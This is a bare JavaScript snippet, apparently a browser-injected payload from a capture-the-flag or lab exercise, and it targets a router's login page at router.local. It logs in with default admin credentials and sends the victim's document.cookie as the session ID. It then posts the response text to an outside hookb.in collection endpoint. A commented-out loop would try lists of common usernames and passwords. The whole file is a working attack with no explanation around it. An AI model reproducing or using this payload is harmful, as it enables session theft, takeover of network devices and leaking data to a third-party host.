// const pwd = ["secured", "password", "123456", "admin"];
// const username = ["admin","cisco","root"];
// for (p in pwd) {
//     for (u in username) {
        const http = new XMLHttpRequest();
        http.open('POST', 'http://router.local/login.php', true);
        http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        http.onload = function () {
            //if (http.readyState === http.DONE) {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hookb.in/QJ9kN7EYZzU8mNzzl1P0', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.responseText));
        
            //}
        };
        const cook = document.cookie;


        http.send("PHPSESSID="+cook+"&username=admin&pin=admin&notRobot=on");
//     }
// }
   

